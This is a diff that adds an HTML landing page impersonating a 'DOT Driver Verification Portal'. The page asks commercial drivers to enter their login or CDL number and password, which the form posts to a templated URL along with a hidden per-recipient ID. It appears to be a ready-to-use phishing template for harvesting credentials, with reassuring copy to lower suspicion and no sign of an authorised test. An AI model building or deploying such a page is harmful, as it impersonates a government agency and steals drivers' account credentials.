@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>DOT Driver Verification</title>
+    <style>
+      body { font-family: Arial, sans-serif; background: #eef1f5;
+             margin: 0; color: #1a1a1a; }
+      .hdr { background: #0d3d77; color: #fff; padding: 14px 24px;
+             font-weight: 600; font-size: 16px; }
+      .panel { max-width: 420px; margin: 60px auto; background: #fff;
+               border: 1px solid #ccd2da; padding: 28px; border-radius: 4px; }
+      label { display: block; font-size: 12px; color: #444; margin: 10px 0 4px; }
+      input { width: 100%; padding: 8px; box-sizing: border-box;
+              border: 1px solid #c0c6cd; border-radius: 3px; font-size: 14px; }
+      button { width: 100%; margin-top: 18px; padding: 10px;
+               background: #0d3d77; color: #fff; border: 0; border-radius: 3px;
+               font-size: 14px; cursor: pointer; }
+      .small { font-size: 11px; color: #888; text-align: center; margin-top: 12px; }
+    </style>
+  </head>
+  <body>
+    <div class="hdr">DOT Driver Verification Portal</div>
+    <div class="panel">
+      <p style="font-size:13px; margin:0 0 14px;">
+        Sign in with your driver-portal credentials to verify CDL details
+        ahead of inspection.
+      </p>
+      <form action="{{.URL}}" method="post" autocomplete="off">
+        <input type="hidden" name="rid" value="{{.RId}}">
+        <label for="dl">Driver login (email or CDL #)</label>
+        <input id="dl" name="driver_login" type="text">
+        <label for="pw">Password</label>
+        <input id="pw" name="driver_pw" type="password">
+        <button type="submit">Sign in</button>
+      </form>
+      <p class="small">For verification only. No fees or fines collected here.</p>
+    </div>
+  </body>
+</html>
